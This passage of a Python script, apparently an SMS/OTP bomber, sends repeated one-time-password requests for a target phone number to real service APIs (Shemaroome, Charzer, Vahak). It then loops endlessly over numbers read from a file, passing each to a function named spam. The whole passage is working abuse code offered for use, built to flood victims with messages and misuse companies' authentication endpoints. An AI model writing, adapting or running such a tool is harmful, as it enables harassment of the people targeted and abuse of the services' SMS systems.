    response = requests.post(url, headers=headers, json=data)

    print(f"Shemaroome sms  : {response.status_code}")
    
    url = 'https://api.charzer.com/auth-service/dh-app/send-otp'

    data = {
    'mobileNumber': phonenumber,
    'appSource': 'CHARZER_APP'
    }

    headers = {
    'Content-Type': 'application/json'
    }
    
    response = requests.post(url, headers=headers, json=data)

    print(f"Charzer  : {response.status_code}")
    
    url = 'https://api.vahak.in/v1/u/o_w'

    data = {
    'is_whatsapp': 'false',
    'phone_number': phonenumber,
    'request_meta_data': 'X0oLFl9sAAZzHuhTmaHk5FuMENOfkkI5sPZU9Coit7IQ/o34XFicpeUxmpMleqmrhvsv2pvvZSCUO8fNR8/zNl3g2NSnvKgTROHkOGvQ7Mk=',
    'scope': '0'
    }

    headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Origin': 'https://www.vahak.in',
    'Referer': 'https://www.vahak.in/'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Vahak sms  : {response.status_code}")
    
    url = 'https://api.vahak.in/v1/u/o_w'

    data = {
    'is_whatsapp': 'false',
    'phone_number': phonenumber,
    'request_meta_data': 'X0oLFl9sAAZzHuhTmaHk5FuMENOfkkI5sPZU9Coit7IQ/o34XFicpeUxmpMleqmrhvsv2pvvZSCUO8fNR8/zNl3g2NSnvKgTROHkOGvQ7Mk=',
    'scope': '0'
    }

    headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Origin': 'https://www.vahak.in',
    'Referer': 'https://www.vahak.in/'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Vahak wp  : {response.status_code}")    


    
    
    
while True:
    with open("Number.txt", encoding='utf-8') as f:
        nus = f.read()
        numbers = nus.split("\n")
        for jj in numbers:
            try:
                if len(jj) > 9:
                    spam(jj)
            except:
                pass
            print("\n\n\n")
